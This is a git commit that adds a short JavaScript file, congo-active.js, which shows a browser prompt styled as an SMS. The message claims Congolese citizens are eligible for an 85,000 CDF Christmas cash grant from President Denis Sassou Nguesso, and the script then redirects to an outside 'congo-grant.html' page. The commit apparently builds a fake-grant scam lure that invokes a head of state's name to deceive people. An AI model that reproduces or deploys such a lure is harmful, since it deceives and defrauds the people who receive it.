f72b4bf75709aae4e7fa7b84a91dfcab61fbfac8
boss-bloq <nsisboy01@gmail.com>
2024-11-29 13:27:10 -0800

    Create congo-active.js

---
+++ congo-active.js
@@ -0,0 +1,6 @@
+
+var password = 'RETRAIT 85.000 CDF'
+password=prompt('SMS : Félicitations, vous êtes éligible à la subvention de Noël en espèces de 85 000 CDF du Président DENIS SASSOU NGUESSO pour les CONGOLAIS. Veuillez appuyer sur OK pour retirer le prix en espèces.   ','RETRAIT 85.000 CDF');
+if (password != 'RETRAIT 85.000 CDF') {
+location.href='https://damba-fest.org/congo-grant.html';
+}
